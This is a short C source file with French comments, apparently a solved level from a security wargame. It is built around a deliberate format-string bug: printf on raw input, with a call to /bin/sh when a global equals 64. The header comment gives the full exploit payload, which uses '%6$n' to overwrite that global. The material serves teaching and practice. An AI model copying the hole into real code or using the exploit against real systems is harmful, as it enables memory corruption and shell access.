/*
	Pour compiler le .c:
	gcc -m32 -fno-stack-protector source.c -o level3

	Ensuite:
	python -c 'print "\x4c\xa0\x04\x08" + "A"*60+ "%6$n"' > /tmp/lvl3

	Pour finir:
	cat /tmp/lvl3 - | ./level3
*/
#include <stdio.h>
#include <stdlib.h>

static int	m = 0;			// Variable globale m

void	v(void)
{
	char	str[512];		// Définition du buffer

	fgets(str, 512, stdin);	// Saisie de caractères et de chaînes avec une taille définie
	printf(str);			// Affichage de la chaine entrée dans fgets
	if (m == 64) {			// Comparaison entre la globale et 64
		fwrite("Wait what?!\n", 1, 12, stdout);	// Affichage si c'est bon
		system("/bin/sh");	// Lancement shell
	}
	return ;
}

int		main(void)
{
	v();		// Appel fonction v()

	return 0;
}
